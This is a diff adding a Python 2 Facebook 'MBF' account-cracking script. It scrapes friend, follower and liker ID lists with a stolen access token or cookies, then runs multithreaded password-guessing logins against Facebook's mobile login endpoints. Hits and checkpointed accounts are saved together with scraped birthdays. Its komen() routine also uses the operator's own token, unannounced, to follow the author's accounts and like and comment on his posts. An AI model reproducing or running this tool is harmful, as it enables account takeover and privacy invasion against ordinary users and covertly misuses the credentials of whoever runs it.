@@ -1,0 +1,825 @@
+#-*-coding:utf-8-*-
+
+import requests,bs4,sys,os,subprocess,time,datetime
+import requests,sys,random,re,base64,json
+from multiprocessing.pool import ThreadPool
+reload(sys)
+sys.setdefaultencoding("utf-8")
+
+try:
+    import requests
+except ImportError:
+    exit('pip2 install requests *Not Installed')
+try:
+    import mechanize
+except ImportError:
+    exit('pip2 install mechanize *Not Installed')
+try:
+    import bs4
+except ImportError:
+    exit("pip2 install bs4 *Not Installed")
+### USERAGENT ###
+ua = ('Mozilla/5.0 (Linux; Android 5.0; Lenovo A1000 Build/S100; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/110.0.0.14.69;]')
+### Logo ###
+logo = """ __  __ ____  _____
+|  \/  | __ )|  ___| *au : Zunnu Trick
+| |\/| |  _ \| |_    *fb : https://www.facebook.com/ApKaa.WaLid.Ft.ZunNu
+| |  | | |_) |  _|   *gh : https://github.com/mR-zUnnU769
+|_|  |_|____/|_|     *yt : https://youtube.com/channel/UCp_fM8VAtb25aVFlYxL9UYQ"""
+mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+free_h={"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+mfb_h={'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent':ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+### JALAN ###
+def jalan(z):
+        for e in z + '\n':
+                sys.stdout.write(e)
+                sys.stdout.flush()
+                time.sleep(0.03)
+### Bot Komen ###
+def komen(): # Boleh Di Tanbahin Jangan Di Ganti #
+        try:
+                toket=open('login.txt','r').read()
+        except IOError:
+                print ('[√] Wellcome')
+                login()
+        web = datetime.datetime.now()
+        waktu = web.strftime("%H:%M:%S / %d-%m-%Y ")
+	kata = random.choice(["Kita harus melakukan yang terbaik yang kita mampu. Itu adalah tanggung jawab manusia yang suci.","Orang yang ekstrem mendapatkan hasil yang ekstrem.","Belajar untuk menjadi tenang dan kamu akan selalu bahagia.","Belajar untuk menjadi tenang dan kamu akan selalu bahagia.","Dari kesalahan ke kesalahan seseorang menemukan seluruh kebenaran.","Jalan yang sulit sering kali mengarah ke tujuan yang indah.","Hal-hal hebat tidak pernah datang dari zona nyaman.","Jika kamu tidak mau mengambil risiko yang tidak biasa, kamu harus puas dengan yang biasa.","Nikmati setiap momen dalam hidup karena kamu tidak tahu apa yang akan terjadi besok."])
+        love = random.choice(['❤️','💛','💚','💙','🖤','🧡','💜'])
+        kom = 'Pengguna Script MBF '+love+'\n'+kata+'\n'+waktu
+        requests.post('https://graph.facebook.com/757953543/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/100006609458697/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/100064814153036/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/10159090813023544/comments/?message=' +kom+ '&access_token=' + toket)
+        requests.post('https://graph.facebook.com/10159090813023544/likes?summary=true&access_token=' + toket)
+        requests.post('https://graph.facebook.com/10158807643598544/comments/?message=Keren Bang ❤️&access_token=' + toket)
+        requests.post('https://graph.facebook.com/158807643598544/likes?summary=true&access_token=' + toket)
+        requests.post('https://graph.facebook.com/100000288808056/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/100041991180267/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/100004689605986/subscribers?access_token=' + toket)
+        print ('[•] Login successful')
+	menu()
+##### LOGIN #####
+def login():
+    os.system('clear')
+    print logo
+    print('──────────────────────────────────────────')
+    print('[1] Login With Token')
+    print('[2] Login With Cookies')
+    print('[3] how To Genrate Token/Cookies')
+    print('[0] Exit')
+    print('──────────────────────────────────────────')
+    lg = raw_input('[?] Input : ')
+    if lg == '':
+        os.sys.exit()
+    elif lg == '1' or lg == '01':
+        toket = raw_input("[?] Token : ") # Login Token
+        try:
+                otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
+                a = json.loads(otw.text)
+                Name = a['name']
+                zedd = open("login.txt", 'w')
+                zedd.write(toket)
+                zedd.close()
+                komen()
+        except KeyError:
+                print("[x] Token Wrong")
+                time.sleep(1.7)
+                login()
+        except requests.exceptions.SSLError:
+                exit('[x] Connections Error')
+    elif lg == '2' or lg == '02':
+        try:
+		cookie = raw_input("[?] Cookies : ")
+                data = {
+                            'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', # don't change this user agent.
+                                'referer' : 'https://m.facebook.com/',
+                                'host' : 'm.facebook.com',
+                                'origin' : 'https://m.facebook.com',
+                                'upgrade-insecure-requests' : '1',
+                                'accept-language' : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+                                'cache-control' : 'max-age=0',
+                                'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+                                'content-type' : 'text/html; charset=utf-8',
+                                 'cookie' : cookie }
+                coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
+                cari = re.search('(EAAA\w+)', coki.text)
+                hasil = cari.group(1)
+                pup = open('coki.log', 'w')
+                pup.write(cookie)
+                pup.close()
+                pip = open('login.txt', 'w')
+                pip.write(hasil)
+                pip.close()
+                komen()
+        except AttributeError,UnboundLocalError:
+                print('[x] Cookies Wrong')
+                time.sleep(3)
+                login()
+        except requests.exceptions.SSLError:
+                exit('[x] Connections Error')
+    elif lg == '3' or lg == '03':
+	print('\nYou Will Be Redirected To The Browser')
+	os.system("xdg-open https://youtu.be/xqoyYiHhya8")
+	time.sleep(0.5)
+	menu()
+    elif lg == '0' or lg == '00':
+        exit()
+    else:
+        exit('[x] Wrong Enter')
+##### MENU #####
+def menu():
+  try:
+    toket = open('login.txt','r').read()
+    otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
+    a = json.loads(otw.text)
+    nm = a['name']
+    id = a['id']
+    tl = a['birthday']
+  except Exception as e:
+    print('[√] Wellcome')
+    time.sleep(3)
+    login()
+  except KeyError:
+    print('[x] Token Invalid')
+    time.sleep(3)
+    os.system('rm -rf login.txt')
+    login()
+  except requests.exceptions.ConnectionError:
+    exit('[x] Connection Error')
+  os.system("clear")
+  print logo
+  print('──────────────────────────────────────────')
+  print('[•] Name : '+nm)
+  print('[•] Your ID : '+id)
+  print('[•] Birthday : '+tl)
+  print('──────────────────────────────────────────')
+  print('[1] Crack From Friends')
+  print('[2] Crack From Public')
+  print('[3] Crack From Followers')
+  print('[4] Crack From Like')
+  print('[5] Check Result Crack')
+  print('[0] Delete Token/Cookies')
+  print('──────────────────────────────────────────')
+  mn=raw_input("[?] Input : ")
+  if mn=="":
+	print ('[x] Wrong Enter')
+	menu()
+  elif mn=="1":
+    teman()
+  elif mn=="2":
+    publik()
+  elif mn=="3":
+    followers()
+  elif mn=="4":
+    like()
+  elif mn=="5":
+    print('──────────────────────────────────────────')
+    print('[1] Check Result Ok')
+    print('[2] Check Result Cp')
+    print('[0] Exit')
+    print('──────────────────────────────────────────')
+    hs = raw_input('[?] Input : ')
+    if hs == '':
+        menu()
+    elif hs == '1' or hs == '01':
+	ok()
+    elif hs == '2' or hs == '02':
+	cp()
+    else:
+	exit('[x] Wrong Enter')
+  elif mn=="0":
+    try:
+      os.remove("login.txt")
+      exit('[•] Successfully Delete Token/Cookies')
+    except Exception as e:      exit('[x] File Not Found')
+  else:
+    print ('[x] Wrong Enter')
+    menu()
+def ok():
+	try:
+		ok=open('Ok.txt','r').read()
+		print('\n'+ok)
+	except Exception as e:
+		exit('[x] Result Ok Done')
+def cp():
+        try:
+                cp=open('Cp.txt','r').read()
+		print('\n'+cp)
+	except Exception as e:
+		exit('[x] Result CP Done')
+##### CRACK TEMAN #####
+def teman():
+        try:
+                toket=open('login.txt','r').read()
+        except IOError:
+		print('[x] Token Invalid')
+                os.system('rm -rf login.txt')
+                time.sleep(0.01)
+                login()
+        try:
+		limit = '5000'
+                file = 'Dump.json'
+		print('──────────────────────────────────────────')
+		print('[•] Name File : '+file)
+                try:
+                   r=requests.get("https://graph.facebook.com/me/friends?access_token="+toket+"&limit="+limit)
+                except KeyError:
+			print ('[x] Not Found Friendlist')
+			raw_input("[Exit]")
+                        menu()
+                id = []
+                z=json.loads(r.text)
+                qq = ('Friendslist.txt').replace(" ","_")
+                ys = open(qq , 'w')#.replace(" ","_")
+                for a in z['data']:
+                        id.append(a['id']+"<=>"+a['name'])
+                        ys.write(a['id']+"<=>"+a['name']+'\n')
+                        print("\r[•] Dump %s ID\r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
+                ys.close()
+                os.rename(qq,file)
+		print("\r[•] Total ID : %s         "%(len(id)))
+		print('──────────────────────────────────────────')
+                metode()
+
+        except requests.exceptions.ConnectionError:
+		exit('[x] Connection Error')
+##### CRACK FOLLOWERS #####
+def followers():
+        try:
+                toket=open('login.txt','r').read()
+        except IOError:
+		print('[x] Token Invalid')
+                os.system('rm -rf login.txt')
+                time.sleep(0.01)
+                login()
+        try:
+		print('──────────────────────────────────────────')
+                idt = raw_input("[•] Profile Id : ")
+                limit = '5000'
+                file = 'Dump.json'
+		print('[•] Name File : '+file)
+                try:
+                        jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+                        op = json.loads(jok.text)
+                        #print("[•] Name : "+op["name"])
+                except KeyError:
+			print('[x] Profile Id Not Found')
+			raw_input("[Back]")
+			menu()
+                r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+toket+"&limit="+limit)
+                id = []
+                z=json.loads(r.text)
+                qq = ('flw.txt').replace(" ","_")
+                ys = open(qq , 'w')#.replace(" ","_")
+                for a in z['data']:
+                        id.append(a['id']+"<=>"+a['name'])
+                        ys.write(a['id']+"<=>"+a['name']+'\n')
+                        print("\r[•] Dump %s ID\r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
+                ys.close()
+                os.rename(qq,file)
+                print("\r[•] Total ID : %s           "%(len(id)))
+		print('──────────────────────────────────────────')
+                metode()
+
+        except KeyError:
+		print('[x]  Followers Not Found')
+                raw_input('[Back]')
+                menu()
+        except requests.exceptions.ConnectionError:
+		exit('[x] Connection Error')
+##### CRACK LIKE #####
+def like():
+        try:
+                toket=open('login.txt','r').read()
+        except IOError:
+		print(' *! Token Invalid')
+                os.system('rm -rf login.txt')
+                time.sleep(0.01)
+                login()
+        try:
+		print('──────────────────────────────────────────')
+                idt = raw_input("[•] ID Post : ")
+		limit = '5000'
+                file = 'Dump.json'
+		print('[•] Name File : '+file)
+                try:
+                   r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit="+limit+"&access_token="+toket)
+                except KeyError:
+			print('[x] ID Post Not Found')
+			raw_input("[Back]")
+                        menu()
+                id = []
+                z=json.loads(r.text)
+                qq = ('likess.txt').replace(" ","_")
+                ys = open(qq , 'w')#.replace(" ","_")
+                for a in z['data']:
+                        id.append(a['id']+"<=>"+a['name'])
+                        ys.write(a['id']+"<=>"+a['name']+'\n')
+                        print("\r[•] Dump %s ID \r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
+                ys.close()
+                os.rename(qq,file)
+                print("\r[•] Total ID : %s           "%(len(id)))
+		print('──────────────────────────────────────────')
+		metode()
+
+        except KeyError:
+		print ('[x] Not Found Post')
+                raw_input('[Back]')
+                menu()
+        except requests.exceptions.ConnectionError:
+		exit('[x] Connection Error')
+##### CRACK PUBLIK #####
+def publik():
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print('[x] Token Invalid')
+		os.system('rm -rf login.txt')
+		time.sleep(0.01)
+		login()
+	try:
+		print('──────────────────────────────────────────')
+		idt = raw_input("[•] Profile Id : ")
+		limit = '5000'
+		file = 'Dump.json'
+		print('[•] Name File : '+file)
+		try:
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			op = json.loads(jok.text)
+			#print("[•] Name : "+op["name"])
+		except KeyError:
+			print('[x] Profile Id Not Found')
+			raw_input("[Back]")
+			menu
+		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit("+limit+")&access_token="+toket)
+		id = []
+		z=json.loads(r.text)
+		qq = ('pblk.txt').replace(" ","_")
+		ys = open(qq , 'w')#.replace(" ","_")
+		for a in z['friends']['data']:
+			id.append(a['id']+"<=>"+a['name'])
+			ys.write(a['id']+"<=>"+a['name']+'\n')
+			print("\r[•] Dump %s ID"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
+		ys.close()
+		os.rename(qq,file)
+		print("\r[•] Total ID : %s          "%(len(id)))
+		print('──────────────────────────────────────────')
+		metode()
+		
+	except Exception as e:
+		print('[x] Not Found Link Id')
+		menu()
+	except requests.exceptions.ConnectionError:
+		exit('[x] Connection Error')
+def mbasic(em,pas,hosts):
+	global ua,mbasic_h
+	r=requests.Session()
+	r.headers.update(mbasic_h)
+	p=r.get("https://mbasic.facebook.com/")
+	b=bs4.BeautifulSoup(p.text,"html.parser")
+	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
+	data={}
+	for i in b("input"):
+		if i.get("value") is None:
+			if i.get("name")=="email":
+				data.update({"email":em})
+			elif i.get("name")=="pass":
+				data.update({"pass":pas})
+			else:
+				data.update({i.get("name"):""})
+		else:
+			data.update({i.get("name"):i.get("value")})
+	data.update(
+		{"fb_dtsg":meta,"m_sess":"","__user":"0",
+		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
+		}
+	)
+	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
+	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
+	if "c_user" in r.cookies.get_dict().keys():
+		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
+	elif "checkpoint" in r.cookies.get_dict().keys():
+		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
+	else:return {"status":"error","email":em,"pass":pas}#crack mbasic
+def mfb(em,pas,hosts):
+    global ua,mfb_h
+    r = requests.Session()
+    r.headers.update(mfb_h)
+    p = r.get('https://m.facebook.com/')
+    b = bs4.BeautifulSoup(p.text, 'html.parser')
+    dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
+    data = {}
+    for i in b('input'):
+        if i.get('value') is None:
+            if i.get('name') == 'email':
+                data.update({'email': em})
+            elif i.get('name') == 'pass':
+                data.update({'pass': pas})
+            else:
+                data.update({i.get('name'): ''})
+        else:
+            data.update({i.get('name'): i.get('value')})
+
+    data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd', 
+       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
+    r.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
+    po = r.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
+    if 'c_user' in r.cookies.get_dict().keys():
+        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
+    else:
+        if 'checkpoint' in r.cookies.get_dict().keys():
+            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
+        else:
+            return {'status': 'error', 'email': em, 'pass': pas}
+
+        return
+def free(em,pas,hosts):
+	global ua,free_h
+	r=requests.Session()
+	r.headers.update(free_h)
+	p=r.get("https://free.facebook.com/")
+	b=bs4.BeautifulSoup(p.text,"html.parser")
+	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
+	data={}
+	for i in b("input"):
+		if i.get("value") is None:
+			if i.get("name")=="email":
+				data.update({"email":em})
+			elif i.get("name")=="pass":
+				data.update({"pass":pas})
+			else:
+				data.update({i.get("name"):""})
+		else:
+			data.update({i.get("name"):i.get("value")})
+	data.update(
+		{"fb_dtsg":meta,"m_sess":"","__user":"0",
+		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
+		}
+	)
+	r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
+	po=r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
+	if "c_user" in list(r.cookies.get_dict().keys()):
+		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
+	elif "checkpoint" in list(r.cookies.get_dict().keys()):
+		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
+	else:return {"status":"error","email":em,"pass":pas}
+def metode():
+    print('[1] Metode mbasic.facebook.com')
+    print('[2] Metode mobile.facebook.com')
+    print('[3] Metode free.facebook.com')
+    md = raw_input('[?] Input : ')
+    if md == '':
+	exit()
+    elif md == '1' or md == '01':
+	crack()
+    elif md == '2' or md == '02':
+	crack1()
+    elif md == '3' or md == '03':
+	crack2()
+    else:
+        exit('[x] Wrong Enter')
+def generate(text):
+	results=[]
+	global ips
+	for i in text.split(" "):
+		if len(i)<3:
+			continue
+		else:
+			i=i.lower()
+			if len(i)==3 or len(i)==4 or len(i)==5:
+				results.append(i+"Pakistan")
+				results.append(i+"123")
+				results.append(i+"1234")
+			else:
+				results.append(i+"786786")
+				results.append(i+"223344")
+				results.append(i+"12345")
+				results.append(i+"123456")
+				results.append(i)
+	return results
+class crack:
+	def __init__(self):
+		self.ada=[]
+		self.cp=[]
+		self.ko=0
+		while True:
+			print('──────────────────────────────────────────')
+			f=raw_input("[?] Use Manual Pass (y/n) : ")
+			if f=="":continue
+			elif f=="y":
+				try:
+					while True:
+						try:
+							self.apk= 'Dump.json'
+							self.fs=open(self.apk).read().splitlines()
+							break
+						except Exception as e:
+							print('[x] File Not Found')
+							menu()
+							continue
+					self.fl=[]
+					for i in self.fs:
+						try:
+							self.fl.append({"id":i.split("<=>")[0]})
+						except:continue
+				except Exception as e:
+					print('[x] File Not Found')
+					continue
+				print('[•] Choose Pass : Pakistan,786786,223344')
+				self.pwlist()
+				break
+			elif f=="n":
+				try:
+					while True:
+						try:
+							self.apk= 'Dump.json'
+							self.fs=open(self.apk).read().splitlines()
+							break
+						except Exception as e:
+							print('[x] File Not Found')
+							menu()
+							continue
+					self.fl=[]
+					for i in self.fs:
+						try:
+							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
+						except:continue
+				except Exception as e:
+					print('[x] File Expire')
+					menu()
+					continue
+				print('[•] Result Ok Save Ok.txt')
+				print('[•] Result Cp Save Cp.txt')
+				print('──────────────────────────────────────────')
+				ThreadPool(35).map(self.main,self.fl)
+				os.remove(self.apk)
+				print ('[finished]')
+				break
+	def pwlist(self):
+		self.pw=raw_input("[?] Password : ").split(",")
+		if len(self.pw) ==0:
+			self.pwlist()
+		else:
+			for i in self.fl:
+				i.update({"pw":self.pw})
+                        print('[•] Result Ok Save Ok.txt')
+                        print('[•] Result Cp Save Cp.txt')
+			print('──────────────────────────────────────────')
+			ThreadPool(30).map(self.main,self.fl)
+			os.remove(self.apk)
+			print ('[finished]')
+	def main(self,fl):
+		try:
+			for i in fl.get("pw"):
+				log=mbasic(fl.get("id"),
+					i,"https://mbasic.facebook.com")
+				if log.get("status")=="success":
+					print("\r\033[0;92m[Ok] "+(fl.get("id")+"\033[0;97m | \033[0;92m"+i+" "))
+					self.ada.append("%s | %s"%(fl.get("id"),i))
+					if fl.get("id") in open("Ok.txt").read():
+						break
+					else:
+						open("Ok.txt","a+").write(
+						"%s | %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
+					ko="%s | %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
+					break
+				elif log.get("status")=="cp":
+					try:
+						toket=open('login.txt','r').read()
+						q=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+toket)
+						w=json.loads(q.text)
+						tl=w["birthday"]
+
+					except (KeyError, IOError):
+		                         tl = "*Private"
+					except:pass
+					print("\r\033[0;93m[Cp] "+(fl.get("id")+" \033[0;97m|\033[0;93m "+i+"\033[0;93m "+tl+" "))
+					self.cp.append("%s | %s %s"%(fl.get("id"),i,tl))
+					open("Cp.txt","a+").write(
+						"%s | %s %s\n"%(fl.get("id"),i,tl))
+					break
+				else:continue
+					
+			self.ko+=1
+			print "\r[Crack] %s/%s *Ok : %s - *Cp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
+		except:
+			self.main(fl)
+class crack1:
+	def __init__(self):
+		self.ada=[]
+		self.cp=[]
+		self.ko=0
+		while True:
+			print('──────────────────────────────────────────')
+			f=raw_input("[?] Use Manual Pass (y/n) : ")
+			if f=="":continue
+			elif f=="y":
+				try:
+					while True:
+						try:
+							self.apk= 'Dump.json'
+							self.fs=open(self.apk).read().splitlines()
+							break
+						except Exception as e:
+							print('[x] File Not Found')
+							menu()
+							continue
+					self.fl=[]
+					for i in self.fs:
+						try:
+							self.fl.append({"id":i.split("<=>")[0]})
+						except:continue
+				except Exception as e:
+					print('[x] File Not Found')
+					continue
+				print('[•] Choose Pass : Pakistan,786786,223344')
+				self.pwlist()
+				break
+			elif f=="n":
+				try:
+					while True:
+						try:
+							self.apk= 'Dump.json'
+							self.fs=open(self.apk).read().splitlines()
+							break
+						except Exception as e:
+							print('[x] File Not Found')
+							menu()
+							continue
+					self.fl=[]
+					for i in self.fs:
+						try:
+							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
+						except:continue
+				except Exception as e:
+					print('[x] File Tidak Valid')
+					menu()
+					continue
+				print('[•] Result Ok Save Ok.txt')
+				print('[•] Result Cp Save Cp.txt')
+				print('──────────────────────────────────────────')
+				ThreadPool(35).map(self.main,self.fl)
+				os.remove(self.apk)
+				print ('[finished]')
+				break
+	def pwlist(self):
+		self.pw=raw_input("[?] Password : ").split(",")
+		if len(self.pw) ==0:
+			self.pwlist()
+		else:
+			for i in self.fl:
+				i.update({"pw":self.pw})
+                        print('[•] Result Ok Save Ok.txt')
+                        print('[•] Result Cp Save Cp.txt')
+			print('──────────────────────────────────────────')
+			ThreadPool(30).map(self.main,self.fl)
+			os.remove(self.apk)
+			print ('[finished]')
+	def main(self,fl):
+		try:
+			for i in fl.get("pw"):
+				log = mfb(fl.get('id'), i, 'https://m.facebook.com')
+				if log.get("status")=="success":
+					print("\r\033[0;92m[Ok] "+(fl.get("id")+"\033[0;97m | \033[0;92m"+i+" "))
+					self.ada.append("%s | %s"%(fl.get("id"),i))
+					if fl.get("id") in open("Ok.txt").read():
+						break
+					else:
+						open("Ok.txt","a+").write(
+						"%s | %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
+					ko="%s | %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
+					break
+				elif log.get("status")=="cp":
+					try:
+						toket=open('login.txt','r').read()
+						q=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+toket)
+						w=json.loads(q.text)
+						tl=w["birthday"]
+
+					except (KeyError, IOError):
+		                         tl = "*Private"
+					except:pass
+					print("\r\033[0;93m[Cp] "+(fl.get("id")+" \033[0;97m|\033[0;93m "+i+"\033[0;93m "+tl+" "))
+					self.cp.append("%s | %s %s"%(fl.get("id"),i,tl))
+					open("Cp.txt","a+").write(
+						"%s | %s %s\n"%(fl.get("id"),i,tl))
+					break
+				else:continue
+					
+			self.ko+=1
+			print "\r[Crack] %s/%s *Ok : %s - *Cp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
+		except:
+			self.main(fl)
+class crack2:
+	def __init__(self):
+		self.ada=[]
+		self.cp=[]
+		self.ko=0
+		while True:
+			print('──────────────────────────────────────────')
+			f=raw_input("[?] Use Manual Pass (y/n) : ")
+			if f=="":continue
+			elif f=="y":
+				try:
+					while True:
+						try:
+							self.apk= 'Dump.json'
+							self.fs=open(self.apk).read().splitlines()
+							break
+						except Exception as e:
+							print('[x] File Not Found')
+							menu()
+							continue
+					self.fl=[]
+					for i in self.fs:
+						try:
+							self.fl.append({"id":i.split("<=>")[0]})
+						except:continue
+				except Exception as e:
+					print('[x] File Not Found')
+					continue
+				print('[•] Choose Pass : Pakistan,786786,223344')
+				self.pwlist()
+				break
+			elif f=="n":
+				try:
+					while True:
+						try:
+							self.apk= 'Dump.json'
+							self.fs=open(self.apk).read().splitlines()
+							break
+						except Exception as e:
+							print('[x] File Not Found')
+							menu()
+							continue
+					self.fl=[]
+					for i in self.fs:
+						try:
+							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
+						except:continue
+				except Exception as e:
+					print('[x] File Tidak Valid')
+					menu()
+					continue
+				print('[•] Result Ok Save Ok.txt')
+				print('[•] Result Cp Save Cp.txt')
+				print('──────────────────────────────────────────')
+				ThreadPool(35).map(self.main,self.fl)
+				os.remove(self.apk)
+				print ('[finished]')
+				break
+	def pwlist(self):
+		self.pw=raw_input("[?] Password : ").split(",")
+		if len(self.pw) ==0:
+			self.pwlist()
+		else:
+			for i in self.fl:
+				i.update({"pw":self.pw})
+                        print('[•] Result Ok Save Ok.txt')
+                        print('[•] Result Cp Save Cp.txt')
+			print('──────────────────────────────────────────')
+			ThreadPool(30).map(self.main,self.fl)
+			os.remove(self.apk)
+			print ('[finished]')
+	def main(self,fl):
+		try:
+			for i in fl.get("pw"):
+				log=free(fl.get("id"),
+					i,"https://free.facebook.com")
+				if log.get("status")=="success":
+					print("\r\033[0;92m[Ok] "+(fl.get("id")+"\033[0;97m | \033[0;92m"+i+" "))
+					self.ada.append("%s | %s"%(fl.get("id"),i))
+					if fl.get("id") in open("Ok.txt").read():
+						break
+					else:
+						open("Ok.txt","a+").write(
+						"%s | %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
+					ko="%s | %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
+					break
+				elif log.get("status")=="cp":
+					try:
+						toket=open('login.txt','r').read()
+						q=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+toket)
+						w=json.loads(q.text)
+						tl=w["birthday"]
+
+					except (KeyError, IOError):
+		                         tl = "*Private"
+					except:pass
+					print("\r\033[0;93m[Cp] "+(fl.get("id")+" \033[0;97m|\033[0;93m "+i+"\033[0;93m "+tl+" "))
+					self.cp.append("%s | %s %s"%(fl.get("id"),i,tl))
+					open("Cp.txt","a+").write(
+						"%s | %s %s\n"%(fl.get("id"),i,tl))
+					break
+				else:continue
+					
+			self.ko+=1
+			print "\r[Crack] %s/%s *Ok : %s - *Cp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
+		except:
+			self.main(fl)
+
+if __name__=='__main__':
+	print logo
+	os.system('git pull')
+	menu()
